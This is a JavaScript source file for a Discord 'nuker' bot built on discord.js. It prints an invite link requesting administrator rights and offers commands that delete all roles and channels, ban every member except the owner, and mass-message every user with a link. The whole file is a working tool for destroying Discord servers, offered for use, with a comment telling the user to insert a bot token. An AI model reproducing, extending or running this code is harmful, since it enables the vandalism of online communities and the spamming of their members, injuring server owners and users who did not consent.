//Beginning of code:

const Discord = require("discord.js");
const config = require("./config.json");
const client = new Discord.Client()
const nuker = client

// When nuker is online:

nuker.on("ready", ()=>{
  console.log("Nuker is launched!")
  console.log(`${client.user.username}`)
  console.log(client.user.id)
  console.log("----------------------")
  console.log("Invite the nuke bot by:")
  console.log(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
  console.log("----------------------")
  console.log("Nuker Commands:")
  console.log(".deleteall - Deletes all channels & roles!")
  console.log(".banall - Bans every user/bots in the guild!")
  console.log(".nuke - Nukes the whole guild!")
  console.log(".dmall - Direct Messages all users")
  console.log("----------------------")
  console.log("Guild Information:")
  nuker.guilds.cache.forEach(g =>{
    console.log(g.name, g.memberCount)
  })
})

// Starting of the code; deleteall, banall, nuke, & dmall.


nuker.on("message", async message =>{
  //deleteall command -
  if(message.content === ".deleteall"){
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((m)=>{
        message.channel.send(`deleted ${m.name} (${m.toString()})`)
        
      })
    })
    //bansll command -
  }else if(message.content === ".banall"){
    message.guild.members.cache.filter(m => m.user.id !== message.guild.ownerID && m.user.id !== nuker.user.id && m.roles.highest.position < message.guild.me.roles.highest.position).forEach((m)=>{
      m.ban("not quazide").then((mem)=>{
        message.channel.send(`banned ${mem.user.id} ${m.user.tag}`)
      })
    })
    //nuker command -
  } else if(message.content === ".nuke"){
    message.guild.channels.cache.forEach((c)=>{
      c.delete()
    })
    //dmall command -
  } else if(message.content === ".dmall"){
    nuker.users.cache.forEach((c)=>{
      c.send(`https://github.com/Tezzy-lab`)
      //you can put your own dm command msg
    })
  }
})
nuker.login(config.token);
// PUT UR FUCKING BOT TOKEN IN CONFIG.JSON FILE!!!